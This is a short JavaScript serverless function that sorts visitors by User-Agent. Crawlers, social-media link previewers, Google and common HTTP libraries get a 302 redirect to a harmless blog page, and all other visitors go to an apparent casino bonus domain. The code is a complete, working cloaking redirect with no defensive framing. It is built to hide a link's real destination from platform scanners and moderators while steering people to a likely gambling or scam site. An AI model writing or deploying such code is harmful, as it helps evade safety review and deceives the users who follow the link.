exports.handler = async (event, context) => {
  const userAgent = event.headers['user-agent']?.toLowerCase() || '';
  const botKeywords = [
    'bot', 'crawl', 'spider', 'facebook', 'meta', 'preview', 'discord', 'vkshare',
    'telegrambot', 'whatsapp', 'slackbot', 'google', 'python-requests', 'fetch',
    'axios', 'headless', 'monitor', 'httpclient', 'go-http-client'
  ];

  const isBot = botKeywords.some(keyword => userAgent.includes(keyword));

  const redirectTo = isBot
    ? 'https://www.gamixlabs.com/blog.html'
    : 'https://bonus.galaxy-casino.live';

  return {
    statusCode: 302,
    headers: {
      Location: redirectTo,
    },
  };
};
